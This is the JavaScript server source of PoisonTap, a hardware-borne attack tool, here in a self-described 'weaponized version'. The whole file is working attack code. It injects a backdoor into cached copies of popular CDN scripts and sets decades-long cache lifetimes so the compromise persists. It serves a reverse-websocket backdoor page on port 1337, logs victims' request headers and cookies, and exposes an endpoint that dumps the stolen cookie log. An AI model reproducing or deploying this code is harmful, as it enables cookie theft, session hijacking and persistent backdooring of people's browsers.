/*
 * PoisonTap
 *  by samy kamkar
 *  http://samy.pl/poisontap
 *  01/08/2016
 *
 * weaponized version by Cory Marsh
 * https://BitSlip6.com 
 * 2019.04.13
 */

// requirements
const http = require("http");
const fs = require('fs');
const format = require('util').format;
const exec = require('child_process').exec;

// global variables for blink state and blink change rate in ms
var BLINK_TIME = 900;
var BLINK_STATE = 0;

// read in backdoor files and open logs
var backdoorPreJs = fs.readFileSync(__dirname + '/cdn_backdoor.js'); // this gets prepended before legit js, eg jquery.js
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
var log_stdout = process.stdout;

// global logging function
console.log = function(d) {
  log_file.write(format(d) + '\n');
  log_stdout.write(format(d) + '\n');
  return 1;
};

console.log("PoisonTap starting up");

// read in all of the local CDN JS files we will be poisoning
var replacejs = fs.readdirSync(__dirname + '/js');
var repobj = {};
var replen = 0;
var repcount = 1;

for (var i in replacejs) {
	repobj[replacejs[i].replace(/__/g, '/')] = fs.readFileSync(__dirname + '/js/' + replacejs[i]);
	replen++;
}

// global blink fuction, you can change blink rate by setting the BLINK_TIME global
var do_blink = function() {
	BLINK_STATE = (BLINK_STATE === 0) ? 1 : 0;
	child = exec('echo '+BLINK_STATE+' | sudo tee /sys/class/leds/led0/brightness');
	setTimeout(function(){do_blink();}, BLINK_TIME);
}

// this is the root file that containis the code to request the top CDN files
// as well as the top domains
var xhtml = fs.readFileSync(__dirname + '/target_injected_xhtmljs.html');
if (!xhtml) {
	process.exit(console.log("Couldn't read target_injected_xhtmljs.html"));
}
if (!backdoorHtml) {
	process.exit(console.log("Couldn't read backdoor.html"));
}
if (!backdoorPreJs) {
	process.exit(console.log("Couldn't read target_backdoor.js"));
}

var server = http.createServer(function(request, response) {
	// force the protocol and handle requests with non standard urls 
	var u = new URL("http://" + request.headers.host + request.url);
	var url = u.hostname + u.pathname;
	console.log(request);
	console.log('Request: ' + url);

	var headers = {
		"Content-Type": "text/html",
		"Server": "PoisonTap/1.0 SamyKamkar/0.1",
		"Cache-Control": "public, max-age=99936000",
		"Expires": "Sat, 26 Jul 2040 05:00:00 GMT",
		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT",
		"Access-Control-Allow-Origin": "*",
		"Access-Control-Allow-Method": "*",
		"X-Frame-Options": "Allow"
	};

	// This will cache and CDN file from the js directory prepended with
	// cdn_backdoor.js
	if (url in repobj) {
		console.log('>>> Known CDN');
		response.writeHead(200, headers);
		response.write(backdoorPreJs);
		response.write(repobj[url]);
		// if we served all of the CDN content, increate blink rate 2x
		if (++repcount >= replen) { BLINK_TIME = 200; }
		return response.end();
	}

	// We cache drop a page on the target domain for the posioned browser 
	// cached for 20 years accessable from any other domain
	else if (url.indexOf('/PoisonTap') != -1) {
		console.log('>>> Inject Backdoor HTML reverse ws 1337');
		console.log(request.headers);
		response.writeHead(200, headers);
		response.write(backdoorHtml);
		return response.end();
	}
	
	// if this is a cookie dump request, return cookie file.  
	// CORS header required to make it work
	else if (url.indexOf('/PoisonCookieDump') != -1) {
		console.log('>>> Cookie Dump');
		response.writeHead(200, headers);
		response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));
		return response.end();
	}

	else if (url.indexOf('/EndPoison') != -1) {
		console.log('>>> All Done, Cleaning up...');
		server.close(() => {
			console.log("server stopped");
			console.log("==== "+new Date().toJSON()+" ["+Date.now()+"] ====\n\n");
			child = exec('echo '+BLINK_STATE+' | sudo tee /sys/class/leds/led0/brightness');
			process.exit(0);
		})
	}
	
    // random AJAX request or load from a page, give our evil content 
    // that loads all the backdoors and siphons all the things
	else {
		console.log('>>> Inject Target xhtmljs');
		response.writeHead(200, headers);
		// inject the file that will make all the additional requests
		response.write(xhtml);
		// set the blink rate to active
		BLINK_TIME = 400;
		return response.end();
	}
});

server.listen(1337);
do_blink();
console.log("==== "+new Date().toJSON()+" ["+Date.now()+"] ====");
console.log("PoisonTap is listening");